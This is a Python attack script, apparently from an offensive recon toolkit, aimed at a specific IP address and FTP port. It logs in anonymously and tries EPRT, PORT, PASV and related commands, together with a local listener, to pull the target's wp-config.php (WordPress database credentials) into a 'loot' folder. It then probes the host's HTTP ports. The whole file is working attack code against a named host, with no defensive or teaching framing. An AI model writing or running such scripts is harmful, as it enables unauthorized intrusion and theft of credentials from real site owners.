#!/usr/bin/env python3
"""Alternative FTP methods: EPSV, EPRT, and HTTP probing."""
import ftplib, time, socket, os

HOST = "103.160.107.175"
PORT = 6969
MAP = "/home/ubuntu/iptvgear.site/recon/active/ftp_filesystem.txt"

def log(msg=""):
    with open(MAP, "a") as f:
        f.write(msg + "\n")
    print(msg)

time.sleep(5)

log(f"\n{'='*70}")
log("ALTERNATIVE METHODS")
log(f"{'='*70}")

try:
    ftp = ftplib.FTP()
    ftp.connect(HOST, PORT, timeout=15)
    ftp.login("anonymous", "anonymous@test.com")
    log("Connected.")
    
    # Try EPSV
    log("\n--- EPSV ---")
    try:
        resp = ftp.sendcmd("EPSV")
        log(f"EPSV: {resp}")
    except Exception as e:
        log(f"EPSV: {e}")
    
    # Try EPRT with our IP
    log("\n--- EPRT ---")
    try:
        # EPRT |1|ip|port| (1=IPv4)
        resp = ftp.sendcmd("EPRT |1|172.31.21.9|8890|")
        log(f"EPRT: {resp}")
        time.sleep(1)
        resp = ftp.sendcmd("RETR wp-config.php")
        log(f"RETR: {resp}")
    except Exception as e:
        log(f"EPRT: {e}")
    
    # Try LPSV
    log("\n--- LPSV ---")
    try:
        resp = ftp.sendcmd("LPSV")
        log(f"LPSV: {resp}")
    except Exception as e:
        log(f"LPSV: {e}")
    
    # Try PASV (check actual IP returned)
    log("\n--- PASV ---")
    try:
        resp = ftp.sendcmd("PASV")
        log(f"PASV: {resp}")
    except Exception as e:
        log(f"PASV: {e}")
    
    # Try to download via PORT + OUR IP with a real listener
    log("\n--- PORT + RETR with listener ---")
    # Simple listener in a thread
    import threading
    listen_port = 8891
    received_data = []
    
    def listen_for_data():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", listen_port))
        srv.listen(1)
        srv.settimeout(15)
        try:
            conn, addr = srv.accept()
            log(f"Data connection from {addr}")
            data = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            conn.close()
            received_data.append(data)
            log(f"Received {len(data)} bytes")
        except socket.timeout:
            log("Listener timed out")
        except Exception as e:
            log(f"Listener error: {e}")
        srv.close()
    
    lt = threading.Thread(target=listen_for_data, daemon=True)
    lt.start()
    time.sleep(0.5)
    
    p1 = listen_port // 256
    p2 = listen_port % 256
    port_cmd = f"PORT 172,31,21,9,{p1},{p2}"
    log(f"{port_cmd}")
    try:
        resp = ftp.sendcmd(port_cmd)
        log(f"PORT: {resp}")
        time.sleep(0.5)
        resp = ftp.sendcmd("RETR wp-config.php")
        log(f"RETR: {resp}")
    except Exception as e:
        log(f"PORT RETR: {e}")
    
    lt.join(timeout=20)
    if received_data:
        outfile = "/home/ubuntu/iptvgear.site/loot/wp-config.php"
        with open(outfile, "wb") as f:
            f.write(received_data[0])
        log(f"Saved to {outfile}")
    else:
        log("No data received via PORT mode")
    
    ftp.quit()
except Exception as e:
    log(f"Main error: {e}")

# HTTP probing
log(f"\n{'='*70}")
log("HTTP PROBING")
log(f"{'='*70}")

import urllib.request
import urllib.error

for port in [80, 443, 8080, 8888]:
    for scheme in ['http', 'https']:
        url = f"{scheme}://{HOST}:{port}/"
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            resp = urllib.request.urlopen(req, timeout=10)
            log(f"{url}: {resp.status} ({len(resp.read())} bytes)")
        except urllib.error.HTTPError as e:
            log(f"{url}: HTTP {e.code}")
        except Exception as e:
            log(f"{url}: {e.__class__.__name__}")

log(f"\n{'='*70}")
log("COMPLETE")
log(f"{'='*70}")